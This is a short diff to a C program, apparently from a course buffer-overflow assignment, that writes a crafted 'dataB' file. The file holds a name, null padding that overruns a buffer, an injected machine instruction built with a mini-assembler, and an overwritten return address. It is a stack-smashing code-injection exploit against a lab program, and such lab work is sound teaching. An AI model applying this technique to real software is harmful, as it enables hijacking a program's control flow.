@@ -11,8 +11,9 @@
 
 #include <stdio.h>
 #include <stdlib.h>
+#include "miniassembler.h"
 
-static const unsigned int lReturnAddress = 0x00400890;
+static const unsigned int lReturnAddress = 0x420076;
 static const char sName[] = "Chinmay Bhandaru";
 
 
@@ -21,6 +22,7 @@ static const char sName[] = "Chinmay Bhandaru";
  * file. Returns 0 upon completion. */
 int main(void) {
     int i;
+    unsigned int uiMovInstr;
 
     /* Open/create file dataB with write privileges */
     FILE *psFile = fopen("dataB", "w");
@@ -29,7 +31,16 @@ int main(void) {
     fprintf(psFile, sName);
 
     /* Add nullbytes to overrun the buffer and mark end of name */
-    for (i = 0; i < 32; i++) {
+    for (i = 0; i < 2; i++) {
+        putc(0, psFile);
+    }
+
+    uiMovInstr = MiniAssembler_mov(0, 'A');
+
+    fwrite(&uiMovInstr, sizeof(unsigned int), 1, psFile);
+
+    /* Add nullbytes to overrun the buffer and mark end of name */
+    for (i = 6; i < 32; i++) {
         putc(0, psFile);
     }
 
